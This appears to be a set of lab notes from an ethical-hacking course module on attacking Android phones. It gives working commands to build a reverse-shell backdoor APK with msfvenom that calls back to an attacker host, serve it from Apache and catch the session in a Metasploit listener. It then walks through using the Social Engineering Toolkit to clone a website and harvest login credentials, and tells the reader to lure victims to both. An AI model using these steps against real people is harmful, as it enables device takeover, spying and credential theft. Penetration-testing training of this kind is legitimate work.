# Module 17 - Hacking Mobile Platforms #

## Creating Binary Payloads ##

Open a Terminal in Android. 
``` su ``` > ``` ip addr add <IP Address with Mask> dev eth0 ``` - To assign the IP Address to the android device

### msfvenom ###
In the attacker machine:

``` service postgresql start ```

``` msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=<Attacker IP> R > <Output Path>/Backdoor.apk ```

### Creating a Directory to Share with the Victim ###
1. ``` mkdir /var/www/html/share ```
2. ``` chmod -R 755 /var/www/html/share ```
3. ``` chown -R www-data:www-data /var/www/html/share ```
4. ``` mv /root/Desktop/Backdoor.apk /var/www/html/share ``` - Moving the malicious file to the shared folder

### Starting the Apache Server ###
``` service apache2 start ```

### Metasploit ###
``` msfconsole ```

Steps to set up a listener:
1. ``` use exploit/multi/handler ```
2. ``` set payload android/meterpreter/reverse_tcp ```
3. ``` set LHOST <Attacker Listener IP> ```
4. ``` exploit -j -z ```

### Luring the Victim ###
Now, the attacker should lure the victim to access: ```http://<Attacker IP>/share``` and download and execute the ```Backdoor.apk``` file.

### Metasploit / Meterpreter ###
If Meterpreter does not start automatically interacting with the victim, type: ``` sessions -i 1 ```.


- - - -

## Harvesting Users' Credentials ##

Open a Terminal in Android. 
``` su ``` > ``` ip addr add <IP Address with Mask> dev eth0 ``` - To assign the IP Address to the android device

### Social Engineering Toolkit ###

In the attacker machine launch the Social Engineering Toolkit.

1. Select ``` 1) Social-Engineering Attacks ```
2. Select ``` 2) Website Attack Vectors ```
3. Select ``` 3) Credential Harvester Attack Method ```
4. Select ``` 2) Site Cloner ```
5. Enter the attacker IP Address
6. Enter the URL to clone

### Luring the Victim ###
Now, the attacker should lure the victim to access: ```http://<Attacker IP>```. The site will be cloned from the original one. Once the user enters credentials, they will be logged into SET. 
